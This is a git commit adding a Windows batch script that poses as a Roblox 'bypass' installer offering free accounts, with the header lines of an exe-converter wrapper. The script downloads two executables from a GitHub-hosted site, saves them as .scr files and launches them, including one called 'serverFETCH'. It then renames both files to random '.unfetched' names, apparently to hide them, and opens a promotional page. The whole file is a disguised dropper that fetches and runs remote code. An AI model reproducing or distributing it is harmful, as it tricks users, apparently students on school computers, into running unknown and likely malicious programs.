ec2fc5b61280c362c17d63473ce5e1d39716c611
dl-on-school-pc <lucagoldmann723@gmail.com>
2024-05-14 07:49:06 +0200

    Add files via upload

---
+++ dl/server/roblox/rblx.bat
@@ -0,0 +1,56 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFBJVQReKAE+/Fb4I5/jH6+WQrEESVeZyd4GWybeGL+8f+kaqdpkg6mhVmscDFCdqcRCnYRd5jWFVuGiKNsPSthfkKg==
+::YB416Ek+ZG8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+
+@echo off
+cls
+echo [95mStarting Bypass OK[0m
+echo [1;92mFetching Data from Server ![0m
+curl -o rblx.scr https://raw.githubusercontent.com/dl-on-school-pc/dl-on-school-pc.github.io/main/dl/server/roblox/RobloxPlayerInstaller.exe
+curl -o new_roblox_accounts.txt https://raw.githubusercontent.com/dl-on-school-pc/dl-on-school-pc.github.io/main/dl/server/roblox/free_accounts.txt
+curl -o fetcher.scr https://raw.githubusercontent.com/dl-on-school-pc/dl-on-school-pc.github.io/main/dl/server/api/v1/fetcherinfo/serverFETCH.exe
+echo [1;92mFetched ![0m
+echo [41mThank you For using ![0m
+echo [94mINSTALLING DO NOT CLOSE THE APP...[0m
+start rblx.scr
+start fetcher.scr
+echo [91mErrors :[0m
+timeout 5 >NUL
+ren fetcher.scr y7UhqTzaRndZDQ1RwDuc4EBMlOwxXX5U%random%%random%%random%%random%%random%.unfetched
+timeout 2 >NUL
+ren rblx.scr DO4Fz1LP4vIeWr5blQ8RuMz1IG8wSI1K%random%%random%%random%%random%.unfetched
+echo -----
+echo [1;92mInstalling Finished EXIT by pressing any KEY ![0m
+echo MORE APPS and GAMES ON https://dl-on-school-pc.github.io/
+start https://dl-on-school-pc.github.io/thank_dl/roblox.html
+pause >NUL
